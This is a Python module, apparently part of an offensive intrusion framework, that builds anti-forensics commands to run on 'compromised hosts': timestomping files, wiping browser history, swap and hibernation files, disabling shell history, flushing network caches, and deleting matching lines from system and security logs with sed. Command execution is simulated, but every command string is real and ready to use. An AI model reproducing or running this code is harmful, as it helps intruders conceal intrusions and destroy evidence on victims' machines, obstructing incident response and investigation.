"""
Advanced Anti-Forensics Manager
Implements sophisticated anti-forensics techniques for stealth and evidence removal
"""

import asyncio
import os
import random
import struct
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from loguru import logger

from .models import (
    CompromisedHost, PlatformType, CleanupConfig
)


class AntiForensicsManager:
    """Advanced anti-forensics and evidence removal manager"""
    
    def __init__(self, cleanup_config: CleanupConfig):
        self.config = cleanup_config
        self.retry_attempts = 3
        self.retry_delay = 2
        logger.info("Anti-Forensics Manager initialized")
    
    async def timestomp_files(self, host: CompromisedHost, file_paths: List[str], 
                             target_timestamp: Optional[datetime] = None) -> bool:
        """Modify file timestamps to avoid detection"""
        logger.info(f"Timestomping {len(file_paths)} files on {host.ip_address}")
        
        if not target_timestamp:
            # Use a timestamp from 30-90 days ago
            days_ago = random.randint(30, 90)
            target_timestamp = datetime.now() - timedelta(days=days_ago)
        
        timestamp_str = target_timestamp.strftime("%Y-%m-%d %H:%M:%S")
        success_count = 0
        
        for file_path in file_paths:
            try:
                if host.platform == PlatformType.WINDOWS:
                    # Use PowerShell to modify timestamps
                    commands = [
                        f'(Get-Item "{file_path}").CreationTime = "{timestamp_str}"',
                        f'(Get-Item "{file_path}").LastWriteTime = "{timestamp_str}"',
                        f'(Get-Item "{file_path}").LastAccessTime = "{timestamp_str}"'
                    ]
                else:
                    # Use touch command for Unix-like systems
                    touch_format = target_timestamp.strftime("%Y%m%d%H%M.%S")
                    commands = [f'touch -t {touch_format} "{file_path}"']
                
                for command in commands:
                    if await self._execute_with_retry(host, command):
                        success_count += 1
                        
            except Exception as e:
                logger.error(f"Timestomping failed for {file_path}: {e}")
        
        logger.info(f"Timestomping completed: {success_count}/{len(file_paths) * len(commands)} operations successful")
        return success_count > 0
    
    async def clear_memory_artifacts(self, host: CompromisedHost) -> bool:
        """Clear sensitive data from memory"""
        logger.info(f"Clearing memory artifacts on {host.ip_address}")
        
        try:
            if host.platform == PlatformType.WINDOWS:
                commands = [
                    # Clear clipboard
                    'echo "" | clip',
                    # Clear PowerShell variables
                    'Get-Variable | Remove-Variable -ErrorAction SilentlyContinue',
                    # Force garbage collection
                    '[System.GC]::Collect()',
                    '[System.GC]::WaitForPendingFinalizers()',
                    # Clear page file on shutdown (registry setting)
                    'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f'
                ]
            else:
                commands = [
                    # Clear swap if possible
                    'swapoff -a && swapon -a',
                    # Drop caches
                    'echo 3 > /proc/sys/vm/drop_caches',
                    # Clear shared memory
                    'ipcrm -M $(ipcs -m | awk \'NR>3 {print $2}\')',
                    # Clear environment variables
                    'unset HISTFILE',
                    'export HISTSIZE=0'
                ]
            
            success_count = 0
            for command in commands:
                if await self._execute_with_retry(host, command):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Memory cleanup failed: {e}")
            return False
    
    async def clear_network_artifacts(self, host: CompromisedHost) -> bool:
        """Clear network-related traces and artifacts"""
        logger.info(f"Clearing network artifacts on {host.ip_address}")
        
        try:
            if host.platform == PlatformType.WINDOWS:
                commands = [
                    # Clear DNS cache
                    'ipconfig /flushdns',
                    # Clear ARP cache
                    'arp -d *',
                    # Clear NetBIOS cache
                    'nbtstat -R',
                    # Clear routing table (careful with this)
                    # 'route delete 0.0.0.0',
                    # Clear network adapter statistics
                    'netsh interface ip delete arpcache'
                ]
            else:
                commands = [
                    # Clear DNS cache (systemd-resolved)
                    'systemctl flush-dns',
                    # Clear ARP cache
                    'ip neigh flush all',
                    # Clear connection tracking
                    'conntrack -F',
                    # Clear network statistics
                    'ss -K'
                ]
            
            success_count = 0
            for command in commands:
                if await self._execute_with_retry(host, command):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Network cleanup failed: {e}")
            return False
    
    async def clear_browser_artifacts(self, host: CompromisedHost) -> bool:
        """Clear browser history, cache, and other artifacts"""
        logger.info(f"Clearing browser artifacts on {host.ip_address}")
        
        try:
            if host.platform == PlatformType.WINDOWS:
                # Chrome paths
                chrome_paths = [
                    '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History',
                    '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\*',
                    '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies'
                ]
                # Firefox paths
                firefox_paths = [
                    '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite',
                    '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*\\cache2\\*'
                ]
                # Edge paths
                edge_paths = [
                    '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History',
                    '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Cache\\*'
                ]
                
                all_paths = chrome_paths + firefox_paths + edge_paths
                commands = [f'del "{path}" /f /q /s' for path in all_paths]
                
            else:
                # Linux browser paths
                browser_paths = [
                    '~/.config/google-chrome/Default/History',
                    '~/.config/google-chrome/Default/Cache/*',
                    '~/.mozilla/firefox/*/places.sqlite',
                    '~/.mozilla/firefox/*/cache2/*',
                    '~/.cache/mozilla/firefox/*'
                ]
                
                commands = [f'rm -rf {path}' for path in browser_paths]
            
            success_count = 0
            for command in commands:
                if await self._execute_with_retry(host, command):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Browser cleanup failed: {e}")
            return False
    
    async def clear_swap_files(self, host: CompromisedHost) -> bool:
        """Clear swap files and hibernation files"""
        logger.info(f"Clearing swap files on {host.ip_address}")
        
        try:
            if host.platform == PlatformType.WINDOWS:
                commands = [
                    # Clear hibernation file
                    'powercfg -h off',
                    'del C:\\hiberfil.sys /f /q',
                    # Clear page file (requires reboot)
                    'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v ClearPageFileAtShutdown /t REG_DWORD /d 1 /f'
                ]
            else:
                commands = [
                    # Turn off swap, clear, and turn back on
                    'swapoff -a',
                    'dd if=/dev/zero of=/dev/$(swapon --show=NAME --noheadings) bs=1M',
                    'mkswap /dev/$(swapon --show=NAME --noheadings)',
                    'swapon -a'
                ]
            
            success_count = 0
            for command in commands:
                if await self._execute_with_retry(host, command):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Swap file cleanup failed: {e}")
            return False
    
    async def selective_log_editing(self, host: CompromisedHost, 
                                  log_patterns: List[str]) -> bool:
        """Selectively edit logs to remove specific patterns instead of clearing entirely"""
        logger.info(f"Performing selective log editing on {host.ip_address}")
        
        try:
            if host.platform == PlatformType.WINDOWS:
                # Use PowerShell to selectively remove log entries
                log_files = [
                    'System', 'Security', 'Application'
                ]
                commands = []
                for log_file in log_files:
                    for pattern in log_patterns:
                        # Remove specific event log entries (this is complex in practice)
                        commands.append(f'wevtutil qe {log_file} | findstr /v "{pattern}"')
            else:
                # Use sed to remove lines matching patterns
                log_files = [
                    '/var/log/auth.log',
                    '/var/log/syslog',
                    '/var/log/messages',
                    '/var/log/secure'
                ]
                commands = []
                for log_file in log_files:
                    for pattern in log_patterns:
                        commands.append(f'sed -i "/{pattern}/d" {log_file}')
            
            success_count = 0
            for command in commands:
                if await self._execute_with_retry(host, command):
                    success_count += 1
            
            return success_count > 0
            
        except Exception as e:
            logger.error(f"Selective log editing failed: {e}")
            return False
    
    async def _execute_with_retry(self, host: CompromisedHost, command: str) -> bool:
        """Execute command with retry logic"""
        for attempt in range(self.retry_attempts):
            try:
                # In a real implementation, this would execute the command on the remote host
                logger.debug(f"Executing anti-forensics command on {host.ip_address} (attempt {attempt + 1}): {command}")
                
                # Simulate command execution with potential failure
                await asyncio.sleep(0.1)
                
                # Simulate 90% success rate
                if random.random() < 0.9:
                    return True
                else:
                    raise Exception("Simulated command failure")
                    
            except Exception as e:
                if attempt < self.retry_attempts - 1:
                    logger.warning(f"Command failed (attempt {attempt + 1}), retrying: {e}")
                    await asyncio.sleep(self.retry_delay)
                else:
                    logger.error(f"Command failed after {self.retry_attempts} attempts: {e}")
                    return False
        
        return False
